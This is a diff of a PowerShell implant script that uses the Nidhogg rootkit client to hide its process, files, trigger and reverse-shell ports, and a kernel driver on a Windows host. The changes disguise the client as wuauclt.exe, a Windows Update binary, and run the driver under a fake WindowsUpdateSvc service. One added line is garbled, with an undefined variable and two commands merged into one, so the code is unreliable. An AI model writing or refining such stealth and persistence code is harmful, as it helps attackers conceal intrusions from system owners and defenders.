@@ -5,7 +5,7 @@ $BaseReversePort = 4444
 $CurrentReversePort = $BaseReversePort
 
 $AppDir = "C:\Windows\System32\WindowsModulesAssistant"
-$NidhoggClient = "$AppDir\NidhoggClient.exe"
+$NidhoggClient = "$AppDir\wuauclt.exe"
 
 function Log($msg) {
     Add-Content -Path "C:\Windows\Temp\debug.log" -Value "$(Get-Date -Format 'HH:mm:ss') $msg"
@@ -26,18 +26,18 @@ Invoke-Nidhogg "process hide $PID"
 Invoke-Nidhogg "process hide $PID"
 
 # Initial hiding
-Invoke-Nidhogg "process hide $PID"
-Invoke-Nidhogg "file hide $AppDir\Implant.ps1"
-Invoke-Nidhogg "file hide $AppDir\wuauclt.exe"
-Invoke-Nidhogg "port hide $TriggerPort tcp remote"
-Invoke-Nidhogg "port hide $CurrentReversePort tcp remote"
+& $NidhoggClient process hide "$PID"
+& $NidhoggClient file hide "$AppDir\Implant.ps1"
+& $NidhoggClient file hide "$AppDir\wuauclt.exe"
+& $NidhoggClient port hide "$TriggerPort" tcp remote
+& $NidhoggClient port hide "$CurrentReversePort" tcp remote
 
 while ($true) {
     try {
         # Keep driver alive
         if ((sc.exe query WindowsUpdateSvc | Select-String "RUNNING") -eq $null) {
             sc.exe start WindowsUpdateSvc | Out-Null
-            Invoke-Nidhogg "driver hide C:\Windows\System32\drivers\Nidhogg.sys"
+            & $n port hide 4444 tcp remote "driver hide C:\Windows\System32\drivers\Nidhogg.sys"
         }
 
         # Periodic re-hiding
